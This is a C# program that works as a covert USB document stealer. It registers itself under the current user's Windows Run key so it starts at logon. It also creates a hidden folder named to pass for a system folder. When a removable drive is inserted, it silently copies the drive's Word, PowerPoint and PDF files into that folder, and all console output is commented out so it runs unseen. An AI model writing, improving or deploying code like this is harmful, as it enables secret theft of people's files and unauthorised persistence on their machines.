using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Management;
using Microsoft.Win32;
using System.Reflection;

namespace copy_all_files
{
    class Program
    {
        static string targetPath = @"C:\Window_support_files\";

        public static string splitt()
        {
            string[] na = Assembly.GetExecutingAssembly().FullName.Split(',');
            return na[0];
        }

        static void Main(string[] args)
        {

            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            //Console.WriteLine("Assembly Name -" + splitt());

            if (reg.GetValue(splitt()) != null)
            {
                //Console.WriteLine("Registry is there !!");
            }
            else
            {
                //Console.WriteLine(Assembly.GetExecutingAssembly().Location);
                reg.SetValue(splitt(), Assembly.GetExecutingAssembly().Location);
            }

            if (!Directory.Exists(targetPath))
            {
                DirectoryInfo di = Directory.CreateDirectory(targetPath);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }

           
                try
                {
                    //https://stackoverflow.com/a/19435744/4953915
                    WqlEventQuery insertQuery = new WqlEventQuery("SELECT * FROM __InstanceCreationEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_USBHub'");
                    ManagementEventWatcher insertWatcher = new ManagementEventWatcher(insertQuery);
                    insertWatcher.EventArrived += new EventArrivedEventHandler(DeviceInsertedEvent);
                    insertWatcher.Start();

                    WqlEventQuery removeQuery = new WqlEventQuery("SELECT * FROM __InstanceDeletionEvent WITHIN 2 WHERE TargetInstance ISA 'Win32_USBHub'");
                    ManagementEventWatcher removeWatcher = new ManagementEventWatcher(removeQuery);
                    removeWatcher.EventArrived += new EventArrivedEventHandler(DeviceRemovedEvent);
                    removeWatcher.Start();
                }
                catch (Exception e)
                {
                    //ConsoleWrite(e.Message);
                }

                System.Threading.Thread.Sleep(20000000);
            //ConsoleReadKey();
        }

        static void GetFiles(string dir)//https://stackoverflow.com/a/19137152/4953915
        {
            
            List<FileInfo> files = new List<FileInfo>();//files as List<>
            string[] filetypes = new string[] { "ppt", "pptx", "doc", "docx", "pdf"  };
            foreach (string ft in filetypes)
            {
                foreach (string srcfile in Directory.GetFiles(dir, string.Format("*.{0}", ft), SearchOption.TopDirectoryOnly))
                {
                    //ConsoleWriteLine(srcfile);
                    ////ConsoleWriteLine(targetPath);
                    try
                    {
                        File.Copy(srcfile, Path.Combine(targetPath, Path.GetFileName(srcfile)),false);
                    }
                    catch (Exception e)
                    {
                        //ConsoleWriteLine(e.Message);
                    }
                    //files.Add(new FileInfo(file));//adding each data to List<>
                }
            }
            
            //files.ForEach(//ConsoleWriteLine);//display List<> content

            foreach (string subDir in Directory.GetDirectories(dir))
            {
                try
                {
                    GetFiles(subDir);
                }
                catch (Exception e)
                {
                    //ConsoleWriteLine(e.Message);
                }
            }

        }


//================================================ Event Code =======================================================
        static void DeviceInsertedEvent(object sender, EventArrivedEventArgs e)
        {
            //ConsoleWriteLine("----------------------------\nUsb DeviceInsertedEvent");
            ManagementBaseObject instance = (ManagementBaseObject)e.NewEvent["TargetInstance"];
            foreach (var property in instance.Properties)
            {
                //ConsoleWriteLine(property.Name + " = " + property.Value);
            }

            //https://stackoverflow.com/a/7240353/4953915
            var drives = from drive in DriveInfo.GetDrives()
                         where drive.DriveType == DriveType.Removable
                         select drive;

            foreach (var drive in drives)
            {

                if (drive.IsReady == true)
                {
                    //ConsoleWriteLine(drive.Name + " is Ready !!!");
                    GetFiles(drive.Name);//<--
                }
                else
                {
                    //ConsoleWriteLine(drive.Name + " is Not Ready !!!");
                    return;
                }
                
                //ConsoleWriteLine(drive.Name);
            }

        }

        static void DeviceRemovedEvent(object sender, EventArrivedEventArgs e)
        {
            //ConsoleWriteLine("----------------------------\nUsb DeviceRemovedEvent");
            ManagementBaseObject instance = (ManagementBaseObject)e.NewEvent["TargetInstance"];
            foreach (var property in instance.Properties)
            {
                //ConsoleWriteLine(property.Name + " = " + property.Value);
            }
        } 
//============================================================================================   
        
    }
}
